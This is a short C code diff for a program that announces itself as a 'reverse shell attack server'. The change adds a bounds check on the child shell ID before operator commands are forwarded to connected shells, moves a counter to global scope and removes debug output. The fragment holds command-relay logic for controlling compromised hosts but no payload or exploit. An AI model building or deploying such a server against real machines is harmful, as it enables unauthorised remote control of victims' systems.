@@ -45,6 +45,7 @@ void sighandler(int signo){
 }
 
 static int childFds[SIZE];
+int idCount = 0;
 
 static int user_read;
 int recv_user_cmd(){
@@ -54,10 +55,12 @@ int recv_user_cmd(){
   read(user_read, &shellid, sizeof(shellid));
   read(user_read, &msg_ln, sizeof(msg_ln));
   read(user_read, cmd, msg_ln);
-
-  printf("==================command on child %d======================", shellid);
-  write(childFds[shellid], cmd, msg_ln);
-  printf("==================end command======================");
+  if(shellid >= idCount){
+    printf("ERR: %d is not a valid child...\n", shellid);
+  }
+  else{
+    write(childFds[shellid], cmd, msg_ln);
+  }
 }
 
 
@@ -66,7 +69,7 @@ int main(int argc, char const* argv[]){
     signal(SIGUSR1, sighandler);
 
     mkfifo(FIFO_NAME, 0777);
-    
+
 
     printf("welcome to the reverse shell attack server!\n");
     printf("PID: %d\n", getpid());
@@ -77,7 +80,6 @@ int main(int argc, char const* argv[]){
 
 
     childFds[SIZE - 1] = 0;
-    int idCount = 0;
 
     //server loop
     while(1){
